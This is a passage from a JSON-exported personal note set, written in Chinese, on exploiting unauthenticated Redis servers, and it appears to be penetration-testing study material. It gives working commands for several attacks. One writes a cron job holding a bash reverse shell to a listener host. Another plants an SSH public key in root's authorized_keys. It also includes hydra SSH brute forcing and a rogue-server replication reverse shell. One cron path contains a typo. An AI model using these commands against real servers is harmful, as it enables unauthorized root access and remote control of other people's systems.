var(--b3-font-color9);","updated":"20241022152755"},"Children":[{"Type":"NodeText","Data":"2.对目标万战根目录有写入权限"}]},{"ID":"20241022103223-njm8kuj","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241022103223-njm8kuj","updated":"20241022103234"},"Children":[{"Type":"NodeText","Data":"无web情况下如何利用"}]},{"ID":"20241022152801-wlr9m8j","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022152801-wlr9m8j","updated":"20241022152818"},"Children":[{"Type":"NodeText","Data":"写定时任务，通过定时任务反弹shell"}]},{"ID":"20241022153511-6kmpxk6","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022153511-6kmpxk6","updated":"20241022153943"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"nc -lvvp 8888#kali监听\n\n#写定时任务\nredis-cli -h 10.10.1.10 -p 6379 #连接目标redis服务\nset  z \"\\n\\n*/1 * * * * /bin/bash -i \u003e\u0026 /dev/tcp/10.10.1.100/8888 0\u003e\u00261\\n\\n\"\n#设置写入，在计划任务前后加入换行以确保写入的计划任务可以被正常解析，每分钟执行一次/bin/bash -i \u0026 /dev/tcp/10.10.1.100/8888 \u003e0\u00261\nconfig set dir /car/spool/cron  #设置备份路径\nconfig set dbfilename root #设置备份文件名\nsave  #保存\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022153511-tb6goox","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022153511-tb6goox"}},{"ID":"20241022152820-p142sgj","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022152820-p142sgj","updated":"20241022152858"},"Children":[{"Type":"NodeText","Data":"写SSH公钥--22，实现免密登录Linux服务器"}]},{"ID":"20241022154114-ph0f5dw","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154114-ph0f5dw","updated":"20241022154219"},"Children":[{"Type":"NodeText","Data":"如果redis的用户是root用户，攻击者可以成功将自己的公钥写入目标服务器的/root/.ssh文件夹的authorized_keys文件中，进而可以无需密码直接登录目标服务器"}]},{"ID":"20241022154220-wl46q7a","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154220-wl46q7a","updated":"20241022154247"},"Children":[{"Type":"NodeText","Data":"生成公钥，默认情况下，生成在用户家目录下的.ssh目录下"}]},{"ID":"20241022154348-kuy4738","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022154348-kuy4738","updated":"20241022154401"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh-keygen -t rsa\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022154431-e6sonjc","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154431-e6sonjc","updated":"20241022154431"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"7a38773e4a3a9fd218573558cad76204"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/7a38773e4a3a9fd218573558cad76204-20241022154431-dx5bij3.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241022154433-02hgbs1","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154433-02hgbs1","updated":"20241022154513"},"Children":[{"Type":"NodeText","Data":"将公钥写入到zy.txt文件，前后用\\n换行，避免和redis其他缓存数据混合"}]},{"ID":"20241022154513-31r4s7r","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022154513-31r4s7r","updated":"20241022154524"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") \u003e /tmp/zy.txt\n\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022154405-cire8c0","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154405-cire8c0","updated":"20241022154604"},"Children":[{"Type":"NodeText","Data":"将zy.txt写入redis服务器中"}]},{"ID":"20241022154605-34fm0on","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022154605-34fm0on","updated":"20241022154852"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"cat /tmp/zy.txt | redis-cli 10.10.1.10 -p 6379 -x set sshkey   #写入文件\n\n\nredis-cli -h 10.10.1.10 -p 6379\n\nconfig set dir /root/.ssh/   设置备份文件路径\nconfig set dbfilename \"authorized_keys\"   设置上传公钥的备份文件名字为authorized_keys\n\nsave  \n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022154405-ers178w","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154405-ers178w"}},{"ID":"20241022154854-25c9kvr","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154854-25c9kvr","updated":"20241022154911"},"Children":[{"Type":"NodeText","Data":"远程连接目标机器"}]},{"ID":"20241022154911-7xqxq5s","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022154911-7xqxq5s","updated":"20241022154933"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"ssh root@10.10.1.10 -i /root/.ssh/id_rsa\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022154854-tejy4mx","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154854-tejy4mx"}},{"ID":"20241022154951-70uw3bk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154951-70uw3bk"}},{"ID":"20241022154951-zhqxvtj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154951-zhqxvtj","updated":"20241022155005"},"Children":[{"Type":"NodeText","Data":"爆破ssh--hydra工具"}]},{"ID":"20241022155007-7q5t4ca","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022155007-7q5t4ca","updated":"20241022160119"},"Children":[{"Type":"NodeText","Data":"hydra -L user.txt - P passwd.txt 10.10.1.10 ssh"}]},{"ID":"20241022160020-lgq600f","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022160020-lgq600f","updated":"20241022160111"},"Children":[{"Type":"NodeText","Data":"-L 指定用户名字典 -l指定用户名 -p指定密码 -P指定密码本 -f"}]},{"ID":"20241022154854-krvaojq","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022154854-krvaojq"}},{"ID":"20241022160549-dsnig2a","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241022160549-dsnig2a","updated":"20241022161040"},"Children":[{"Type":"NodeText","Data":"远程主从复制反弹shell"}]},{"ID":"20241022161025-9nk60b4","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241022161025-9nk60b4","updated":"20241022161026"},"Children":[{"Type":"NodeText","Data":"这里将redis-rogue-server-master的exp.so复制到Awsome-Redis-Rogue-Server的目录下使用，因为exp.so带system模块。"}]},{"ID":"20241022160923-bwp2bc4","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241022160923-bwp2bc4","updated":"20241022160929"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"Awsome-Redis-Rogue-Server工具下载地址：GitHub - Testzero-wz/Awsome-Redis-Rogue-Server: Redis-Rogue-Server Implement\n\n执行反弹\n\npython3 redis-rogue-server.py -rhost 192.168.190.129 -lhost 192.168.190.128\n\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241022103238-pu9vznj","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241022103238-pu9vznj","updated":"20241022103241"},"Children":[{"Type":"NodeText","Data":"信息收集"}]},{"ID":"20241022103255-g4fk6rj","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241022103255-g4fk6rj","updated":"20241022103256"},"Children":[{"Type":"NodeText","Data":"CDN"}]},{"ID":"20241022103343-9j30hyg","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20241022103343-9j30hyg","updated":"20241022103356"},"Children":[{"Type":"NodeText","Data":"用户先网站发起的请求是什么样的"}]},{"ID":"20241022103358-wdvwf6l","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20241022103358-wdvwf6l","updated":"20241022103411"},"Children":[{"Type":"NodeText","Data":"cdn服务器有没有渗透的价值"}]},{"ID":"20241022103315-7689mh6","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241022103315-7689mh6","updated":"20241022103318"},"Children":[{"Type":"NodeText","Data":"fofa"}]},{"ID":"20241022103322-fnjv098","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20241022103322-fnjv098","updated":"20241022103331"},"Children":[{"Type":"NodeText","Data":"google语法搜索"}]},{"ID":"20241022103134-lmvh6zu","Type":"NodeParagraph","Properties":{"id":"20241022103134-lmvh6zu"}}]}